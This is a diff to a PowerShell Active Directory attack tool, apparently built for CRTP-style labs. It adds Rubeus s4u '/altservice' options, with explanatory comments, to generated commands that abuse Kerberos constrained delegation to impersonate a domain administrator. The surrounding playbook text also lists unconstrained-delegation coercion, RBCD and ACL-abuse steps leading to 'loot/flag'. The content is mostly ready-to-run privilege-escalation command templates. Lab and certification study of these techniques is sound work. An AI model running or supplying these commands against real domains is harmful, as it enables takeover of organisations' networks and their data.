@@ -1296,14 +1296,17 @@ function Invoke-CRTPEnum {
                 $c += "`n[$ei] CONSTRAINED DELEGATION (account)  ->  $($d.User)"
                 $c += "     GOAL: impersonate administrator to the allowed service ($($d.SPN))."
                 $c += "     RUN :"
-                $c += "       Rubeus.exe s4u /user:$($d.User) /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
+                $c += "       Rubeus.exe s4u /user:$($d.User) /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /altservice:cifs,host,ldap,http /ptt"
+                $c += "       # /altservice trick: S4U2Proxy ignores the service class, so ONE allowed SPN"
+                $c += "       #   lets you request cifs/host/ldap/etc on that host (e.g. CIFS for file access)."
                 $c += "     NEXT: you hold a ticket as administrator to that service - use it."
             }
             'ConstrainedHost' {
                 $c += "`n[$ei] CONSTRAINED DELEGATION (host)  ->  $($d.Host)"
                 $c += "     GOAL: impersonate administrator to the allowed service ($($d.SPN))."
                 $c += "     RUN  (<NTLM> = the machine account hash of $($d.Host)):"
-                $c += "       Rubeus.exe s4u /user:$($d.Host)`$ /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
+                $c += "       Rubeus.exe s4u /user:$($d.Host)`$ /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /altservice:cifs,host,ldap,http /ptt"
+                $c += "       # /altservice: request cifs/host/ldap on that host from the one allowed SPN (S4U2Proxy ignores service class)."
                 $c += "     NEXT: access that service as administrator."
             }
             'RBCD' {
@@ -1518,7 +1521,8 @@ function Invoke-CRTPEnum {
     $pb += "############################################################################"
     $pb += "GOAL : turn a normal domain foothold into high privilege."
     $pb += "OPTIONS (use whichever the recon flagged; commands are in EXPLOIT_COMMANDS.txt):"
-    $pb += "  * Constrained deleg : Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /ptt"
+    $pb += "  * Constrained deleg : Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /altservice:cifs,host /ptt"
+    $pb += "                        (/altservice pivots the service class - one allowed SPN -> cifs/host/ldap on that host)"
     $pb += "  * Unconstrained host: Rubeus.exe monitor ; then coerce a DC -> MS-RPRN.exe \\$dc \\<unconstrained-host>"
     $pb += "  * RBCD              : add/own a machine acct -> set RBCD -> Rubeus s4u /msdsspn:cifs/<target> /ptt"
     $pb += "  * Dangerous ACL     : Set-DomainUserPassword / Add-DomainGroupMember (on the object you control)"
@@ -1680,13 +1684,13 @@ function Invoke-CRTPEnum {
             }
             'ConstrainedUser' {
                 $ch += "`n($cn) CONSTRAINED DELEGATION (user) -> $t"
-                $ch += "    1) Rubeus.exe s4u /user:$t /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
+                $ch += "    1) Rubeus.exe s4u /user:$t /rc4:<NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /altservice:cifs,host /ptt"
                 $ch += "    2) access the target service as administrator (e.g. dir \\<host>\c`$)"
                 $ch += "    => WIN: admin on that service -> loot/flag there"
             }
             'ConstrainedHost' {
                 $ch += "`n($cn) CONSTRAINED DELEGATION (host) -> $t"
-                $ch += "    1) Rubeus.exe s4u /user:$t`$ /rc4:<machine-NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /ptt"
+                $ch += "    1) Rubeus.exe s4u /user:$t`$ /rc4:<machine-NTLM> /impersonateuser:administrator /msdsspn:$(($d.SPN -split ',')[0]) /altservice:cifs,host /ptt"
                 $ch += "    => WIN: admin to that service as administrator"
             }
             'RBCD' {
